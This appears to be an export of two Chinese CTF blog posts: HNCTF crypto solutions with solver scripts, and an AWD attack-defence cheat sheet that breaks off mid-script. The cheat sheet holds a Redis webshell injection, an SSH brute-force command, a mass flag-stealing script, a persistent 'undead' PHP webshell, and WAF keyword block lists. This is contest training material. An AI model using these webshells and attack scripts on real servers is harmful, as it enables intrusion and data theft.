[{"id":"d860456be5f63fa9cfc13cf6900001a3","title":"HNCTF-Crypto","content":"[Week1]baBAbaseSEsebase全家桶，base92，91，85，64，32，16\nflag为NSSCTF{th3re_1s_als0_b4se_36_45_58_62_100}\n[Week1]A dictatorlzw_uswksj_uahzwj_ak_gfw_gx_lzw_egkl_tskau_udskkausd_uahzwjk\n凯撒密码，18位偏移\nthe_caesar_cipher_is_one_of_the_most_basic_classical_ciphers\n[Week1]littleprince我借助的在线网站结合爆破出来的，方法有点笨，但是可以出来，在线网站可以规划出他们的相关函数，然后就可以一个个爆破而出\ntxtdef enc(a,b,c):\n    return a&gt;&gt;b|(a&amp;((1&lt;&lt;b)-1))&lt;&lt;(c-b)\ndef outp(x,h):\n    p=randint(1&lt;&lt;h,1&lt;&lt;h+1)\n    q=randint(1&lt;&lt;h,1&lt;&lt;h+1)\n    c1,c2=x%p,x%q\n    print(p,q,c1,c2)\nm=bytes_to_long(flag)\nm_len=m.bit_length()\nd,h,st=32,16,32\nr=m_len%d\nassert(r&gt;h)\nwhile st&lt;=m_len:\n    x=enc(m,st,m_len)\n    x&gt;&gt;=(m_len-d)\n    outp(x,h)\n    st+=d\nm&gt;&gt;=(m_len-r)\noutp(m,h)这里其实就是对每32位操作，也就是从最右边到最左边，然后一一加密，理解出这个就可以进行解密，我是采用爆破，具体算法没有分析\n得出flag为nssctf{Y0u_kn0w_one_l0ves_the_sunset_when_0ne_is_so_sad}\n[Week1]baby_rsatxtfrom Crypto.Util.number import bytes_to_long, getPrime\nfrom gmpy2 import *\nfrom secret import flag\nm = bytes_to_long(flag)\np = getPrime(128)\nq = getPrime(128)\nn = p * q\ne = 65537\nc = pow(m,e,n)\nprint(n,c)\n# 62193160459999883112594854240161159254035770172137079047232757011759606702281\n# 17331436837911040930486942133359735652484926528331507431552667656734821231501常规rsa题解，分解p，q就行了，代码就不详细写了\n[Week1]你想学密码吗？执行代码就行了\n[Week1]XXXOOORRRtxtfrom flag import flag\nfrom Crypto.Util.number import *\nimport os\n\nrandBytes = [bytes_to_long(os.urandom(64)) for _ in range(3)]\nm = bytes_to_long(flag)\n\nprint(f&#39;a = &#123;randBytes[0]&#125;&#39;)\nprint(f&#39;b = &#123;randBytes[0] ^ randBytes[1]&#125;&#39;)\nprint(f&#39;c = &#123;randBytes[1] ^ randBytes[2]&#125;&#39;)\nprint(f&#39;d = &#123;m ^ randBytes[0] ^ randBytes[1] ^ randBytes[2]&#125;&#39;)\n\n&#39;&#39;&#39;\na = 1215421974111272707828609697064234072332368362928440865251897449605952163161176359366553487776268706107760670434157083936287598207881176904763353849369234\nb = 10533604054267448009117468094542127075826310122733511023911022436253583775790861879410728001403728088545946257902341417532648419689212361977221573357292618\nc = 6401236597601556248960570084212025183497657335932789785351897915858852832577623776212842429736547820800219382515052263929074210010546149322465536545021479\nd = 5711309307698496426409561761492698639489294806611133698231840146911562848869711567477706456972659368849642409039245400981517493100724067475248620536111560\n&#39;&#39;&#39;了解异或的性质就行了\ntxtfrom Crypto.Util.number import *\nimport os\n\n\n\na = 1215421974111272707828609697064234072332368362928440865251897449605952163161176359366553487776268706107760670434157083936287598207881176904763353849369234\nb = 10533604054267448009117468094542127075826310122733511023911022436253583775790861879410728001403728088545946257902341417532648419689212361977221573357292618\nc = 6401236597601556248960570084212025183497657335932789785351897915858852832577623776212842429736547820800219382515052263929074210010546149322465536545021479\nd = 5711309307698496426409561761492698639489294806611133698231840146911562848869711567477706456972659368849642409039245400981517493100724067475248620536111560\n\nprint(long_to_bytes(a^b^a^b^c^a^d))\nNSSCTF&#123;XOR_ha5_many_propertie5_and_thi5_i5_ju5t_one_of_them&#125;[Week1]爱妃txtfrom secret import flag\nfrom random import getrandbits\nfrom string import *\n\ndef encrypt(message,a,b,m):\n    return bytes([(i*a+b)%m for i in message])\n\na,b = getrandbits(4),getrandbits(8)\nprint(f&#39;c = &#123;encrypt(flag,a,b,1&lt;&lt;8)&#125;&#39;)\n\n# c = b&#39;y\\xba\\xba\\xea\\xc7\\x11\\xc2\\xc7\\xcb\\xd8ZV\\xd8ZVp\\xb1\\xb1\\xd8\\x19\\xa4V\\xa4\\x19\\x8aM\\xa83g\\xd8&amp;\\x19\\xdc&#39;仿射密码\n求出a，b\ntxtr a in range(2**3,2**4):\n    for b in range(2**7,2**8):\n        if encrypt(b&#39;NSSCTF&#39;,a,b,1&lt;&lt;8)==c[0:6]:\n            print(a)\n            print(b)写逆向解密\ntxtfrom string import *\nimport gmpy2\nc = b&#39;y\\xba\\xba\\xea\\xc7\\x11\\xc2\\xc7\\xcb\\xd8ZV\\xd8ZVp\\xb1\\xb1\\xd8\\x19\\xa4V\\xa4\\x19\\x8aM\\xa83g\\xd8&amp;\\x19\\xdc&#39;\nmessaget=b&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;_&#39;\ndef encrypt(message,a,b,m):\n    return bytes([(i*a+b)%m for i in message])\nfrom Crypto.Util.number import *\na=13\nb=131\nm=1&lt;&lt;8\ndef decrypt(message,a,b,m):\n    return bytes([(i-b)*gmpy2.invert(a,m)%m for i in message])\nprint(decrypt(c,a,b,m))\nNSSCTF&#123;This_is_affine_encryption&#125;[WEEK2]littleLattice简单格密码\ntxth = 26523576589113781532769165293024254940419790396713708680496148398686334583553504180195363282085884580924842673123375450894537445679687851322807762432476357713740302064160599132450619363411158141423252170448770929403179895813409897048848337375715079396639330537231353596884530617911351334318435031007342479134081403319324838464987064025256038807217697133175585927493402963025439540077915248356077623612217525231722274634984400273765262532561558296870531741633238736650375250957780701118781183335729715295271752736307479795186963108377228330313771245434127095507278278768792281414702334956407755841000748255424212840137\np = 29908110980126088961686288727545150169450107297750996656924523214377817308111189721234667959695817050736874247951762130190209278324144437406652857446810518839546701950883392761869656586963587376306050382973323860395932741791372333809871487575268245618618143456971257992301722141464238875859134379745122404533776003095129169004284619647906206323263396219776072091827094295366090100037898314156271404760715453914459484087562963158208356228410105170495322276351631637885450926240143055767142216931354736779666836018983658010126520397012025067407223630891975504746697630878807952266767406899527721170062789607980517722293\n\nL = matrix(ZZ, [[1, h],[0, p]])\nv = L.LLL()[0]\nprint(v)然后带进去就行了\ntxtprint(&#39;NSSCTF&#123;&#39; + md5(bytes.fromhex(hex(f+g)[2:])).hexdigest() + &#39;&#125;&#39;)[WEEK2]Chaos[WEEK2]RSA again常规rsa\ntxtimport gmpy2\nimport libnum\ndef de(c, e, n):\n    k = 0\n    while True:\n        mm = c + n*k\n        result, flag = gmpy2.iroot(mm, e)\n        if True == flag:\n            return result\n        k += 1\nn = 19920284552214772740140135352548541831031690920425912140961436065508824546041514076016684238261995522677433833330399269923572993489681770913908642529489382472548548664350078176417366141695108301338793624641102311886122714705781923892243561473766978666116035403145672686443197319003393949350402512739343998236331447680561106899174404316265329944969786438022711742891334905159259854026408058542492105569778656883811323759583727586331462200020945101286801110840081277963013591342157754264111051785385892113635682519079401538045775697382691195557344630571694510115674941400112478156619785019370731073096018975390492287333\nc = 1752041777918702842605810950957832076618830231626916748933875881505173164404519153781007066742915517004902508987841695668088780745675304779496841107726530280651344357647334690721873124324358539328142005709830859468027528835981960873390785515876157664035579935532043154959183555353553164481674735512873428044452976229459806219115571797514157279125\ne=3\nm=de(c,e,n)\nprint(m)\nprint(libnum.n2s(int(m)))\nNSSCTF&#123;Key_should_not_be_too_small&#125;[WEEK2]strange RSAtxtfrom Crypto.Util.number import *\nfrom secret import flag\n\npad = lambda x:x + bytes([16 - len(x)%16] * (16 - len(x)%16))\nm = bytes_to_long(pad(flag))\np = getPrime(100)\nq = getPrime(100)\nn = p*p*q*q\ne = 0x10001\nc = pow(m,e,n)\n\nprint(f&#39;n = &#123;n&#125;&#39;)\nprint(f&#39;c = &#123;c&#125;&#39;)\nprint(f&#39;e = &#123;e&#125;&#39;)\n\n&#39;&#39;&#39;\nn = 564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761\nc = 269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013\ne = 65537\n&#39;&#39;&#39;和强网杯的ASR类似，先分解n，之后对phi处理\ntxtimport gmpy2\nfrom Crypto.Util.number import *\nimport sympy\np = 709662686105519282917793669093\nq = 1058314117179226194777612760717\nn = 564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761\nc = 269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013\ne = 65537\nphi=(p-1)*(q)*(p)*(q-1)\nd=gmpy2.invert(e, phi)\nm=pow(c,d,n)\nprint(long_to_bytes(m))\nNSSCTF&#123;You_should_use_tool&#125;[WEEK2]solve_the_equation解方程呗\ntxtfrom Crypto.Util.number import bytes_to_long, getPrime\nfrom gmpy2 import *\nfrom flag import flag\nm = bytes_to_long(flag)\np = getPrime(2048)\nq = getPrime(2048)\nn = p * q\ne = 65537\ngift = 2022 * p + 9 * q + 28 * e\nc = pow(m,e,n)\nprint(n,c,gift)\n# 559013759419746202691240598235115105126834606071307611491891982898293133657843987454339580258031532272691584368719342942404675509580909313170933925796189789232538297110756754383546447669571766593521267667716779348776308179675709803388978100416839504625045239819627379469827980589668625084314985969634985583431058156810528172627873121320455715399011186280324236548934145366222271636328254497851289112650375015433741699898290781472376090171361276557886637892800404830030548291487615566596504234212554381817510798554015481259307992175226543595948798873846335558746933940683482819439715578130806800536423771482474206047548549237879025655562739463111822524633757040958223066367993671472508367287181357997804485542311011003871312708995599690715923692968372474814753669031805664070760705148563294700043336457334028810890271434599241312612447640877347296648737167576464851763570272180801042067934843953206083053874624644994067168364645748243999074053494066054657595233970985982095621265309066132852511490426399921749091156312387594448586826952283581592003247165562367202134878625798756167825941929996806801073247649667626854029875184014003650020610359836971629737204456239324237077361643697429780638179887750984791035339697744210904151734797\n# 73407318923483936681380982096598838839602514018601041044571793373013418096970487001956204920233481604663088115926046001478564679328045899017826536373925483312496867862798918521256833686293905627264784839084309695013473729502056597198558911052248943918139429481528120149662544426266704140382476129564563832751550189116712164319522536680400998100426969878312141399338984622535922004572374724499994480294086487511972287034778386491943792466926044305651852709046949243652756946391206931252732067537917128777152678266816232179411054474713462051435447023851233892017069674808619784767176865947753180156093197684363218543237706358137237603822953178987601908200096630034921280599733190041134038060644827637374731999991143342404380959195318030935855850625849684867326087432054830971960076859722417639414733054394674533018860606074648324450983897579183842853010968597034663149214229791831193351337193195298921766564073265470525286769595835642479920483047959570057149110246705969802722576770273329236163660486942433423522588321736639231667766680582482974393228214947178327111783901303686854030864244720750585928819691608599558058859371899416709995780300197269497143959726959313506292966639680257096421491364629690813416340577056873916752193925\n# 63829120016023768052886024054478552450378183173692549289836790500844466624984770449526584263524969873611417764466777251459739549064993441916734929304056657281688756040121378172997367361118927461471925755841160032723693319039128805185488328610549652307644061769088611063117016010827595409949224043526660999362737741312450095192593608666286680915796697255817583078927076945852260612453896867746751729217633935143780193497702898684210698859292191506586139420497299988065973759272644964857853100511651254633164029275099534568064491202987945733565755982565356202756330311841048849063747767451397616638500281324618902190280761\ntxtimport gmpy2\nfrom Crypto.Util.number import *\nimport sympy\nn=559013759419746202691240598235115105126834606071307611491891982898293133657843987454339580258031532272691584368719342942404675509580909313170933925796189789232538297110756754383546447669571766593521267667716779348776308179675709803388978100416839504625045239819627379469827980589668625084314985969634985583431058156810528172627873121320455715399011186280324236548934145366222271636328254497851289112650375015433741699898290781472376090171361276557886637892800404830030548291487615566596504234212554381817510798554015481259307992175226543595948798873846335558746933940683482819439715578130806800536423771482474206047548549237879025655562739463111822524633757040958223066367993671472508367287181357997804485542311011003871312708995599690715923692968372474814753669031805664070760705148563294700043336457334028810890271434599241312612447640877347296648737167576464851763570272180801042067934843953206083053874624644994067168364645748243999074053494066054657595233970985982095621265309066132852511490426399921749091156312387594448586826952283581592003247165562367202134878625798756167825941929996806801073247649667626854029875184014003650020610359836971629737204456239324237077361643697429780638179887750984791035339697744210904151734797\nc=73407318923483936681380982096598838839602514018601041044571793373013418096970487001956204920233481604663088115926046001478564679328045899017826536373925483312496867862798918521256833686293905627264784839084309695013473729502056597198558911052248943918139429481528120149662544426266704140382476129564563832751550189116712164319522536680400998100426969878312141399338984622535922004572374724499994480294086487511972287034778386491943792466926044305651852709046949243652756946391206931252732067537917128777152678266816232179411054474713462051435447023851233892017069674808619784767176865947753180156093197684363218543237706358137237603822953178987601908200096630034921280599733190041134038060644827637374731999991143342404380959195318030935855850625849684867326087432054830971960076859722417639414733054394674533018860606074648324450983897579183842853010968597034663149214229791831193351337193195298921766564073265470525286769595835642479920483047959570057149110246705969802722576770273329236163660486942433423522588321736639231667766680582482974393228214947178327111783901303686854030864244720750585928819691608599558058859371899416709995780300197269497143959726959313506292966639680257096421491364629690813416340577056873916752193925\ngift=63829120016023768052886024054478552450378183173692549289836790500844466624984770449526584263524969873611417764466777251459739549064993441916734929304056657281688756040121378172997367361118927461471925755841160032723693319039128805185488328610549652307644061769088611063117016010827595409949224043526660999362737741312450095192593608666286680915796697255817583078927076945852260612453896867746751729217633935143780193497702898684210698859292191506586139420497299988065973759272644964857853100511651254633164029275099534568064491202987945733565755982565356202756330311841048849063747767451397616638500281324618902190280761\ne=65537\np,q=sympy.symbols(&#39;p q&#39;)\na=sympy.solve([p*q-n,2022 * p + 9 * q + 28 * e-gift],[p,q])\nprint(a)\np=31488299927163782375594305784598354985055343576902151378139638110290196067918972709864013036909993584566357500427488971564319756822589646977081872239028723217808372250207143372686512583814138881980368846428364451724191019810210583450208745323418623199057207740178726519465136933610452840086315545766227500114368026151391214297362847972215483754128409704386255997220347329566039222555930464490406419002226257326118774942404683970363544788642504594073256844610344691049585870560973659315882902006631997716334351866723219577903275769313404136367236735062099234386473703566068495328080598914833401280780692803508570349879\nq=17753062588733343270481973113408741177364273466266578137604693537521130628067514464616655876995871735360322066932727884076111196635241747675042626304508770586691927800281585936137657405193182456402216484778567926375452998098111716574027285177466244350043079827469560084278792340806640810521556665260999347942843603815228875925103340718552529438783648172063716949726071718858811605089496505238883332792493647818670062684514188459512366295227468596668231188353669195967903222039580635681985850471261694526218866731687175727118621937360285536800367141087950091875609247828705723374310716178275472084635608436063660110043\nphi=(p-1)*(q-1)\nd=gmpy2.invert(e, phi)\nm=pow(c,d,n)\nprint(long_to_bytes(m))\nNSSCTF&#123;S4g3_is_4_g00d_thing&#125;[WEEK2]hash老套路题目了，最近比赛很多见，写个交互就行了\ntxtfrom hashlib import *\nfrom pwn import *\nimport itertools\nstrings=string.ascii_letters + string.digits\ndef proof_of_work(end,sha):\n    num=4\n    strings_list=itertools.permutations(strings,int(num))\n    for start in strings_list:\n        start=&#39;&#39;.join(start)\n        if sha256((start+end.decode()).encode()).hexdigest()==sha.decode():\n            print(start)\n            return start\nip=&#39;1.14.71.254&#39;\nport=28759\nio=remote(ip,port)\ncontext.log_level=&#39;debug&#39;\nio.recvuntil(&#39;sha256(XXXX+&#39;)\nmessage=io.recvuntil(&#39;\\n&#39;)[:-1]\nend=message[:16]\nSHA=message[-64:]\nxxxx=proof_of_work(end,SHA)\nio.sendafter(&#39;Give me XXXX&#39;,xxxx)\nio.recvuntil(&#39;You get flag!&#39;)\nprint(io.recvlines(2))[WEEK2]S1mple_ECB了解ecb的性质，是拼接的，取前32位和后32位，分别解密就行了\n难度不大\n[WEEK2]a_big_water_problemsage一把梭\ntxtp=1909085838901160004148366390307428971507303404468754423228343787769448200442038361348125740523088751663337211595662597150812621519152229037912543068209\nt=1722797706292328891382841146705672635973386450156658022578860976717568774388136853606026526614826060041480340908970565567375361451272929245900841087253\nPR.&lt;x&gt; = PolynomialRing(Zmod(p))\nf=x*x-t\nprint(f.roots())\nfrom Crypto.Util.number import *\nprint(long_to_bytes(2552829431219639078757092213205613607180492987942875443078188655619852649786182396933825962365))\nNSSCTF&#123;There_is_no_flag_here_get_away!&#125;[WEEK2]md5太残暴了常规的md5爆破\ntxtimport hashlib\nplaintext = &#39;flag&#39;\nmd5 = &#39;ac7f4d52c3924925aa9c8a7a1f522451&#39;\nh=&#39;ABCDEFGHIJKLMNOPQRSTUVWSYZ&#39;\nz=&#39;abcdefghijklmnopqrstuvwsyz&#39;\nt=&quot;0123456789&quot;\ny=[]\nh1=&#39;&#39;\nfor m in t:\n    for a in t:\n        for b in t:\n            for c in t:\n                h1=str(m)+str(a)+str(b)+str(c)\n                y.append(h1)\n\n\nfor z in y:\n            plan=&#39;flag&#123;G&#39;+str(0)+str(0)+&#39;d_P4ssw0rd_N3v3r_F0rg3t_63&#39;+z+&#39;&#125;&#39;\n            m = hashlib.md5()\n\n            m.update(plan.encode(&quot;utf-8&quot;))\n            psw = m.hexdigest()\n            if psw[0:4]==&#39;ac7f&#39;:\n                print(plan)\n                flag&#123;G00d_P4ssw0rd_N3v3r_F0rg3t_638291&#125;[WEEK2]mathRSA解方程一把梭\ntxtimport sympy,gmpy2\nfrom Crypto.Util.number import *\nn = 76236418318712173274495941060488893810931309177217802334230599201457092723011685048556311576262486371987147895332408646920500226769161418792142565209634495797142268681403865426056588605013602625268553194169434049817172340173907696496945054049859221379092764811535206778031226535614731731322630330166833765943\ne = 65537\nc = 7207616060389865156270906240837846478541820008527247539698331406253371238674590766101711421196342768182325013873320402422918804780590951789425587131632422554819735000106070325708057225062376701298825910565526713270553888227235612227223162695870584803109353377288421750982913226189395526612487664144379690552\nh = 130285072635228037239175162118613869214302695058325046962039091162567931492116336918638092534964417960274466351834311039222269165021532950982276262717322395682559639859781516047319178212473103057947426886870612637975024605166325017663998263834789814181250953051730859433354534450232382414565421858172075431133498326501045697132640582932453817599366612200146802110424409285814189125929844293789544163802323048780585398714263586547670912817768592459281775837372982750626103047573532664320692775783627129463700810934670066747044799514243631607384814191188276380589420289084574680852618867732847029105400406874790675559126905078326495799755425006555539699119063191489852930421412630857588890593040420277938268954008973405431053073576987401154763326417551463323055736754390446\np,q=sympy.symbols(&#39;p q&#39;)\na=sympy.solve([p*q-n,p**5 - q**4-h],[p,q])\nprint(a)\np=10543357481374908938696626650832667304979816176891429562773232136754485382413647547320866232418359800743787286242710171986152592431595912519025867918658127\nq=7230753434414569972828808651891325142186523078619542872286840414394373161212272545789342965212718184298307353595004152854764254216044770456139231711296409\nphi=(p-1)*(q-1)\nd=gmpy2.invert(e, phi)\nm=pow(c,d,n)\nprint(long_to_bytes(m))\nflag&#123;6d21f18a-831d-4834-8cef-5e47218bc3ce&#125;","slug":"HNCTF题解-Crypto","date":"2023-03-14T18:56:36.000Z","categories_index":"CTF","tags_index":"Crypto","author_index":"xmmlaz"},{"id":"5deac5f75bb01e022a6aa8151fb3a9dd","title":"AWD详解","content":"AWDAWD最主要的就是手速！！！ 同时队伍分配一定要合理，密码一定第一时间改掉，修改完配置文件一定记得重启使之生效。\n连接SSHshellssh-copy-id -i ~/.ssh/id_rsa.pub root@xx.xx.xx.xx\nssh root@xx.xx.xx.xx改密码ssh\nshellpasswd root网站\nshell登录网站后台（普遍是弱口令，如果不是去数据库翻一下）然后改密码mysql\nshellSET PASSWORD FOR root@localhost = PASSWORD(&#39;123456&#39;);查看进程shellnetstat -tpnl \nps -df\ntop杀死进程shellkill -9 PID\nkillall 名称如果杀不掉，就查看父进程，杀掉父进程，如果还不行继续往上查 删掉木马文件，重新杀进程\nshellps -ef | grep 3045如果进程不允许关闭 可以用 nc 监听一个端口，达到欺骗目的\nshellnc -lv 6666扫描端口shellnmap -sn xx.xx.xx.0/24\nnmap -sV -Pn -n -v --open xx.xx.xx.0/24流量监控shelltcpdump tcp -i eth0 -t -s 0 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap备份网站shelltar -zcvf web.tar.gz /var/www/html备份数据库shellmysqldump -uroot -p --databases [dbname] &gt; /tmp/db.sqlfind命令查找行数最短的文件\nshellfind ./ -name &#39;*.php&#39; | xargs wc -l | sort -u查找最近20分钟修改过的文件\nshellfind /var/www/html -name *.php -mmin -20查找危险函数\nshellfind . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;开启日志日志功能在 /etc/httpd/conf 目录有个 httpd.conf 直接 vi/vim 编辑器打开用 / 搜索 access.log\n这俩前面如果有 # 删掉 # 然后保存退出\nshellCustomLog &quot;logs/access.log&quot; combined\nCustomLog &quot;logs/access.log&quot; commonaccess.log 显示 POST 请求传参\nshell# LoadModule dumpio_module modules/mod_dumpio.so然后重启 Apache，使修改的配置文件生效\nshellsystemctl restart httpd然后直接 实时 查看 access.log 文件的 新增 内容\nshelltail -f access.log使用-f参数时不会中断文件监视，需要通过ctrl+c手动结束。\nphp.ini一般来说文件都在 /etc/php.ini\n在不影响正常功能的情况下 禁用 危险函数\nshelldisable_functions = exec,system,shell_exec,popen,passthru,pcntl_exec,phpinfo预防SQL注入\nshellmagic_quotes_gpc = on修复远程文件包含\nshellallow_url_fopen = off  （是否允许打开远程文件）  \nallow_url_include = off（是否允许include/require远程文件）切记修改完配置文件重启\nshellservice php-fpm restartPHP读取函数shellfile_get_contents()\nhighlight_file()\nfopen()\nreadfile()\nfread()\nfgetss()\nfgets()\nparse_ini_file()\nshow_source()\nfile()\n-----------------------------------\nvar_dump(scandir(&#39;/&#39;)); 文件包含修复直接把它目录限制死在 /var/www/html\nshellint_set(&quot;open_basedir&quot;,&quot;/var/www/html&quot;);Redis未授权shellconfig set dir path\n\nset feiye &quot;\\n\\n\\n&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;\\n\\n\\n&quot;\n\nconfig set dbfilename service.php\n\nsave批量SSH链接shellhydra -l root -p dcn -f ip.txt ssh批量攻击脚本shellimport requests\nimport re\nurl=[]\nflag=[]\nfor i in range(101,151):\n    url.append(&quot;http://10.0.0./&quot; + str(i))\nfor x in url:\n    postdata = &#123;&#39;cmd&#39;:&quot;system(&#39;cat+/var/www/html/flag&#39;)&quot;&#125;\n    sussess = requests.post(x+&quot;shell.php&quot;,data=postdata)\n    if &#39;flag&#39; in sussess.content:\n        flag.append(re.search(&quot;flag&#123;.*&#125;&quot;,sussess.content))\n        print(flag)\n    else:\n        print(x+&quot;: failed&quot;)\nfor f in flag:\n    inflag=requests.get(&quot;domain.com/flag.php?token=token&amp;flag=&quot;+f)不死马shell&lt;?php\nset_time_limit(0);\nignore_user_abort(true);\nunlink(__FILE__);\nwhile(true)&#123;\n    file_put_contents(&#39;.shell.php&#39;, &#39;&lt;?php @eval($_POST[cmd]);&#39;);\n    usleep(100);\n&#125;\n?&gt;删除不死马shell#!/bin/bash\ndire=&quot;/var/www/html/.shell.php/&quot;\nfile=&quot;/var/www/html/.shell.php&quot;\nrm -rf $file\nmkdir $dire\n./xx.shWAFshell&lt;?php\n$request[&#39;url&#39;] = $_SERVER[&#39;REQUEST_URI&#39;];\n$request[&#39;time&#39;] = date(&#39;Y-m-d H:i:s&#39;);\n\nif($_POST)&#123;\n    foreach($_POST as $k =&gt; $v)&#123;\n        $request[$k]=urldecode($v);\n    &#125;\n&#125;\n\n$file = fopen(&#39;waf.log&#39;,&#39;a&#39;);\nfwrite($file,json_encode($request) . &quot;\\n&quot;);\nfclose($file);\n\nforeach($_POST as $key =&gt; $value)&#123;\n    waf($value);\n&#125;\nforeach($_GET as $key =&gt; $value)&#123;\n    waf($value);\n&#125;\n\nfunction waf($str)&#123;\n    $filed=&#39;flag|cat|less|nl|more|tac|tail|base64|system&#39;;\n    if(preg_match(&quot;/$filed/im&quot;,$str))&#123;\n        exit(&#39;flag&#123;asdfaqawfawfawf&#125;&#39;);\n    &#125;\n&#125;通常WAFshell&lt;?php\ndate_default_timezone_set(&quot;PRC&quot;);\n//这块在开始的代码没有的，我加的。不加就会报错。\n//error_reporting(E_ALL);\n//ini_set(&#39;display_errors&#39;, 1);\n\n/*\n** 线下攻防php版本waf\n**\n** Author: 落\n*/\n\n/*\n检测请求方式，除了get和post之外拦截下来并写日志。\n*/\nif($_SERVER[&#39;REQUEST_METHOD&#39;] != &#39;POST&#39; &amp;&amp; $_SERVER[&#39;REQUEST_METHOD&#39;] != &#39;GET&#39;)&#123;\n    write_attack_log(&quot;method&quot;);\n&#125;\n\n$url = $_SERVER[&#39;REQUEST_URI&#39;]; //获取url来进行检测\n\n$data = file_get_contents(&#39;php://input&#39;); //获取post的data，无论是否是mutipart\n\n$headers = get_all_headers(); //获取header\n\nfilter_attack_keyword(filter_invisible(urldecode(filter_0x25($url)))); //对URL进行检测，出现问题则拦截并记录\nfilter_attack_keyword(filter_invisible(urldecode(filter_0x25($data)))); //对POST的内容进行检测，出现问题拦截并记录\n\n/*\n检测过了则对输入进行简单过滤\n*/\nforeach ($_GET as $key =&gt; $value) &#123;\n    $_GET[$key] = filter_dangerous_words($value);\n&#125;\nforeach ($_POST as $key =&gt; $value) &#123;\n    $_POST[$key] = filter_dangerous_words($value);\n&#125;\nforeach ($headers as $key =&gt; $value) &#123;\n    filter_attack_keyword(filter_invisible(urldecode(filter_0x25($value)))); //对http请求头进行检测，出现问题拦截并记录\n    $_SERVER[$key] = filter_dangerous_words($value); //简单过滤\n&#125;\n\n/*\n获取http请求头并写入数组\n*/\nfunction get_all_headers() &#123; \n    $headers = array(); \n \n    foreach($_SERVER as $key =&gt; $value) &#123; \n        if(substr($key, 0, 5) === &#39;HTTP_&#39;) &#123; \n            $headers[$key] = $value; \n        &#125; \n    &#125; \n \n    return $headers; \n&#125; \n\n\n/*\n检测不可见字符造成的截断和绕过效果，注意网站请求带中文需要简单修改\n*/\nfunction filter_invisible($str)&#123;\n    for($i=0;$i&lt;strlen($str);$i++)&#123;\n        $ascii = ord($str[$i]);\n        if($ascii&gt;126 || $ascii &lt; 32)&#123; //有中文这里要修改\n            if(!in_array($ascii, array(9,10,13)))&#123;\n                write_attack_log(&quot;interrupt&quot;);\n            &#125;else&#123;\n                $str = str_replace($ascii, &quot; &quot;, $str);\n            &#125;\n        &#125;\n    &#125;\n    $str = str_replace(array(&quot;`&quot;,&quot;|&quot;,&quot;;&quot;,&quot;,&quot;), &quot; &quot;, $str);\n    return $str;\n&#125;\n\n/*\n检测网站程序存在二次编码绕过漏洞造成的%25绕过，此处是循环将%25替换成%，直至不存在%25\n*/\nfunction filter_0x25($str)&#123;\n    if(strpos($str,&quot;%25&quot;) !== false)&#123;\n        $str = str_replace(&quot;%25&quot;, &quot;%&quot;, $str);\n        return filter_0x25($str);\n    &#125;else&#123;\n        return $str;\n    &#125;\n&#125;\n\n/*\n攻击关键字检测，此处由于之前将特殊字符替换成空格，即使存在绕过特性也绕不过正则的\\b\n*/\nfunction filter_attack_keyword($str)&#123;\n    if(preg_match(&quot;/select\\b|insert\\b|update\\b|drop\\b|delete\\b|dumpfile\\b|outfile\\b|load_file|rename\\b|floor\\(|extractvalue|updatexml|name_const|multipoint\\(/i&quot;, $str))&#123;\n        write_attack_log(&quot;sqli&quot;);\n    &#125;\n\n    //此处文件包含的检测我真的不会写了，求高人指点。。。\n    if(substr_count($str,$_SERVER[&#39;PHP_SELF&#39;]) &lt; 2)&#123;\n        $tmp = str_replace($_SERVER[&#39;PHP_SELF&#39;], &quot;&quot;, $str);\n        if(preg_match(&quot;/\\.\\.|.*\\.php[35]&#123;0,1&#125;/i&quot;, $tmp))&#123; \n            write_attack_log(&quot;LFI/LFR&quot;);;\n        &#125;\n    &#125;else&#123;\n        write_attack_log(&quot;LFI/LFR&quot;);\n    &#125;\n    if(preg_match(&quot;/base64_decode|eval\\(|assert\\(/i&quot;, $str))&#123;\n        write_attack_log(&quot;EXEC&quot;);\n    &#125;\n    if(preg_match(&quot;/flag/i&quot;, $str))&#123;\n        write_attack_log(&quot;GETFLAG&quot;);\n    &#125;\n\n&#125;\n\n/*\n简单将易出现问题的字符替换成中文\n*/\nfunction filter_dangerous_words($str)&#123;\n    $str = str_replace(&quot;&#39;&quot;, &quot;‘&quot;, $str);\n    $str = str_replace(&quot;\\&quot;&quot;, &quot;“&quot;, $str);\n    $str = str_replace(&quot;&lt;&quot;, &quot;《&quot;, $str);\n    $str = str_replace(&quot;&gt;&quot;, &quot;》&quot;, $str);\n    return $str;\n&#125;\n\n/*\n获取http的请求包，意义在于获取别人的攻击payload\n*/\nfunction get_http_raw() &#123; \n    $raw = &#39;&#39;; \n\n    $raw .= $_SERVER[&#39;REQUEST_METHOD&#39;].&#39; &#39;.$_SERVER[&#39;REQUEST_URI&#39;].&#39; &#39;.$_SERVER[&#39;SERVER_PROTOCOL&#39;].&quot;\\r\\n&quot;; \n     \n    foreach($_SERVER as $key =&gt; $value) &#123; \n        if(substr($key, 0, 5) === &#39;HTTP_&#39;) &#123; \n            $key = substr($key, 5); \n            $key = str_replace(&#39;_&#39;, &#39;-&#39;, $key); \n            $raw .= $key.&#39;: &#39;.$value.&quot;\\r\\n&quot;; \n        &#125; \n    &#125; \n    $raw .= &quot;\\r\\n&quot;; \n    $raw .= file_get_contents(&#39;php://input&#39;); \n    return $raw; \n&#125;\n\n/*\n这里拦截并记录攻击payload\n*/\nfunction write_attack_log($alert)&#123;\n    $data = date(&quot;Y/m/d H:i:s&quot;).&quot; -- [&quot;.$alert.&quot;]&quot;.&quot;\\r\\n&quot;.get_http_raw().&quot;\\r\\n\\r\\n&quot;;\n    $ffff = fopen(&#39;log_is_a_secret_file.txt&#39;, &#39;a&#39;); //日志路径 \n    fwrite($ffff, $data);  \n    fclose($ffff);\n    if($alert == &#39;GETFLAG&#39;)&#123;\n        echo &quot;HCTF&#123;aaaa&#125;&quot;; //如果请求带有flag关键字，显示假的flag。（2333333）\n    &#125;else&#123;\n        sleep(15); //拦截前延时15秒\n    &#125;\n    exit(0);\n&#125;\necho $_SERVER[&#39;QUERY_STRING&#39;];\n?&gt;\n文件监控shell# -*- coding: utf-8 -*-\n#use: python file_check.py 